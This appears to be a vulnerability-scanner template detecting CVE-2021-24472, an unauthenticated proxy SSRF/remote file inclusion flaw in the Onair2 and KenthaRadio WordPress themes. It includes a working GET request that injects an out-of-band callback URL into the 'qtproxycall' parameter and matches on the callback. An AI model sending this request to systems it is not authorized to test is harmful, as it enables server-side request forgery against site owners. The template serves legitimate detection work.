id: CVE-2021-24472

info:
  name: Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Request Forgery
  author: Suman_Kar
  severity: critical
  description: Onair2 < 3.9.9.2 and KenthaRadio < 2.0.2  have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.
  reference:
    - https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24472
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24472
    cwe-id: CWE-918
  tags: wordpress,lfi,ssrf,oast,wpscan,cve,cve2021

requests:
  - raw:
      - |
        GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/05/05
